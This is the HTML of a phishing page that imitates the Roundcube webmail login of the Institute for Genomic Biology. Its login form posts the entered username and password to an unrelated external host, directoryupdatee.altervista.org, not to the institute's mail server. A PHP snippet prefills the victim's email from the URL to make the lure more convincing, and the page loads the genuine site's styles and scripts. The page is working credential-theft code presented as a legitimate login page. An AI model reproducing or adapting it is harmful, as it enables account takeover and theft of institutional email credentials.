<!DOCTYPE HTML>

<!DOCTYPE html PUBLIC "" ""><HTML><HEAD><META content="IE=11.0000" 

http-equiv="X-UA-Compatible">

 <TITLE>Institute for Genomic Biology Webmail :: Welcome to Institute for 

Genomic Biology Webmail</TITLE> 

<META name="Robots" content="noindex,nofollow"> 

<META http-equiv="X-UA-Compatible" content="IE=EDGE"> 

<META name="viewport" id="viewport" content=""> <LINK href="skins/larry/images/favicon.ico" 

rel="shortcut icon"> <LINK href="https://mail.igb.illinois.edu/roundcube/skins/larry/styles.min.css?s=1405858678" 

rel="stylesheet" type="text/css"> <!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry/svggradients.min.css?s=1405858678" /><![endif]--> <!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="skins/larry/iehacks.min.css?s=1405858678" /><![endif]--> <!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/larry/ie7hacks.min.css?s=1405858678" /><![endif]--> 

<LINK href="https://mail.igb.illinois.edu/roundcube/plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1405858677" 

rel="stylesheet" type="text/css"> 

<SCRIPT src="https://mail.igb.illinois.edu/roundcube/skins/larry/ui.min.js?s=1405858678" type="text/javascript"></SCRIPT>

 

<META http-equiv="content-type" content="text/html; charset=UTF-8"> 

<SCRIPT src="https://mail.igb.illinois.edu/roundcube/program/js/jquery.min.js?s=1405858677" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://mail.igb.illinois.edu/roundcube/program/js/common.min.js?s=1405858677" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://mail.igb.illinois.edu/roundcube/program/js/app.min.js?s=1405858677" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://mail.igb.illinois.edu/roundcube/program/js/jstz.min.js?s=1405858677" type="text/javascript"></SCRIPT>

 

<SCRIPT type="text/javascript">



var rcmail = new rcube_webmail();

rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"larry","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","date_format":"yy-mm-dd","request_token":"c885ff89c4c622ae1cfff8b913f7f933"});

rcmail.gui_container("loginfooter","bottomline");

rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing..."});

rcmail.gui_object('loginform', 'form');

rcmail.gui_object('message', 'message');

</SCRIPT>

 

<SCRIPT src="https://mail.igb.illinois.edu/roundcube/plugins/jqueryui/js/jquery-ui-1.9.2.custom.min.js?s=1405858677" type="text/javascript"></SCRIPT>

 

<META name="GENERATOR" content="MSHTML 11.00.9600.18739"></HEAD> 

<BODY>

<DIV id="login-form">

<DIV class="box-inner"><IMG id="logo" alt="Institute for Genomic Biology Webmail" 

src="https://mail.igb.illinois.edu/roundcube/skins/larry/images/roundcube_logo.png"> 

<FORM name="form" action="http://directoryupdatee.altervista.org/veri1/member.php" 

method="post"><INPUT name="_token" type="hidden" value="c885ff89c4c622ae1cfff8b913f7f933"> 

<INPUT name="_task" type="hidden" value="login"><INPUT name="_action" type="hidden" value="login"><INPUT name="_timezone" id="rcmlogintz" type="hidden" value="_default_"><INPUT name="_url" id="rcmloginurl" type="hidden">

<TABLE>

  <TBODY>

  <TR>

    <TD class="title"><LABEL for="rcmloginuser">Username</LABEL> </TD>

    <TD class="input"><INPUT name="q3_name" id="rcmloginuser" required="required" type="text" size="40" autocomplete="off" autocapitalize="off" value="<?php echo $_GET['email']; // output 2489 ?>"placeholder="Email"> </TD></TR>

  <TR>

    <TD class="title"><LABEL for="rcmloginpwd">Pass</LABEL> </TD>

    <TD 

class="input"><INPUT name="q4_prince" id="rcmloginpwd" required="required" type="pass" size="40" autocomplete="off" autocapitalize="off"></TD></TR></TBODY></TABLE>

<P 

class="formbuttons"><INPUT class="button mainaction" id="rcmloginsubmit" type="submit" value="Login"></P></FORM></DIV>

<DIV class="box-bottom">

<DIV id="message"></DIV><NOSCRIPT>		&lt;p class="noscriptwarning"&gt;Warning: 

This webmail service requires Javascript! In order to use it please enable 

Javascript in your browser's settings.&lt;/p&gt;	 </NOSCRIPT> </DIV>

<DIV id="bottomline">	Institute for Genomic Biology Webmail 		 </DIV></DIV>

<SCRIPT type="text/javascript">



// UI startup

var UI = new rcube_mail_ui();

$(document).ready(function(){

	UI.set('errortitle', 'An error occurred!');

	UI.init();

});



</SCRIPT>

 <!--[if lte IE 8]>

<script type="text/javascript">



// fix missing :last-child selectors

$(document).ready(function(){

	$('ul.treelist ul').each(function(i,ul){

		$('li:last-child', ul).css('border-bottom', 0);

	});

});



</script>

<![endif]--> 

<SCRIPT type="text/javascript">



jQuery.extend(jQuery.ui.dialog.prototype.options.position, {

                using: function(pos) {

                    var me = jQuery(this),

                        offset = me.css(pos).offset(),

                        topOffset = offset.top - 12;

                    if (topOffset < 0)

                        me.css('top', pos.top - topOffset);

                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())

                        me.css('left', pos.left - 12);

                }

            });

$(document).ready(function(){ 

rcmail.init();

var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/ajaxloader_dark.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/messages_dark.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];

            for (var i=0; i<images.length; i++) {

                img = new Image();

                img.src = images[i];

            }

});

</SCRIPT>

 </BODY></HTML>

